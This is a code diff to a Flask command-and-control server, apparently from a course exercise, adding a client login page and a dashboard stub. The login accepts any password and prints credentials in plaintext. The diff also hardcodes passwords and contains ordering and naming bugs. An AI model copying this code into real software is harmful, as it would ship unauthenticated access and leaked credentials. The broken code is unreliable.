@@ -1,11 +1,9 @@
-from ipaddress import ip_address
-from os import getuid
-from flask import Flask , request, jsonify
+from flask import Flask , request, jsonify, redirect, render_template, url_for
 from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
 from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
 import hashlib
 
-app = Flask(__name__) # use this to generate routes and handlers
+
 
 # some useful notes here #
 """
@@ -13,15 +11,23 @@ sqlite:///:memory: (in-memory database)
 sqlite:///relative_path/test.db (relatie path file-based database)
 sqlite:////absolute_path/test.db (abs path file-based database)
 """
+###############################
 
 # set the database to work with flask
+app = Flask(__name__, template_folder=template_dir) # use this to generate routes and handlers
+# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite' # set the database to work with flask
+
 # app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite'
 app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:@localhost/c2_server' #mysql://username:password@server/db
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Set to True if you want Flask-SQLAlchemy to track modifications of objects and emit signals
 db = SQLAlchemy(app)
 
 
+
+# configs
 password = "ch0nky" # a temperary password to test the server
+localhost = "http://127.0.0.1:5000"
+template_dir = "../client/templates"
 
 # code snippets from lecture13
 
@@ -38,6 +44,11 @@ class User(db.Model): # SQLAlchemy class for client
     def __repr__(self):
         return '<User %r>' % self.username
 
+class Client(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.String)
+    password = db.Column(db.String)
+    
 class Task(db.Model): # a SQLAlchemy class
     id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
     # need to specify length of String if using MySQL; Feel free to change the length
@@ -124,6 +135,77 @@ def register_agent(): # --> this is a handler
     print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")
 
     return jsonify({"status": "ok", "message": "Welcome!"})
+
+@app.route("/")
+def home():
+    return render_template("login.html")
+
+@app.route('/login_client', methods=['POST'])
+def login_client():
+    """
+        listens to the /register_client route
+        and processes the registration request from clients
+    """
+
+    try:
+        client_id = request.form.get('client_id')
+        client_password = request.form.get('password')
+        #TODO: check password here
+        print(f"[+] client_id: {client_id}, client_password: {client_password}")
+        return redirect(url_for("dashboard")) # redirect to the home page
+    except:
+        print("[-] client registration failed")
+        return render_template("unauthorized.html")
+    
+    ## check userID and password
+    ## if correct, grant access to home page
+    
+    return ""
+
+@app.route('/dashboard', methods=['GET'])
+def home_page():
+    """
+        Listens to the /dashboard route
+        This page should show all the agents & operators connected to the server
+        
+    """
+    return "welcome to dashboard!"
+    
+
+
+## Wayne's Notes ##
+"""
+    1. displaying message sent from backend to frontend
+
+    In HTML:
+    {% if message %}
+        <h1>{{message}}!</h1>
+    {% endif %}
+
+    In Backend:
+    return render_template('hello.html', message="Welcome!")
+
+    2. receiving message from frontend to backend
+
+    In HTML:
+    <div id="song_content">
+        <form method="post" action="{{ url_for('displaysearch') }}">
+            <label for="song_title"></label>
+            <input type="song_title" name="song_title" placeholder="Enter a song title here.." />
+            <input type="submit" value="Search">
+        </form>
+    </div>
+
+    In backend:
+    @app.route("/displaysearch", methods=['POST'])
+    def displaysearch():
+        try:
+            song = request.form.get('song_title') ## get input from webpage
+        except:
+            print("couldn't find all tokens")
+            return render_template('song.html', message='error')
+
+"""
 
 if __name__ == '__main__':
     app.run()
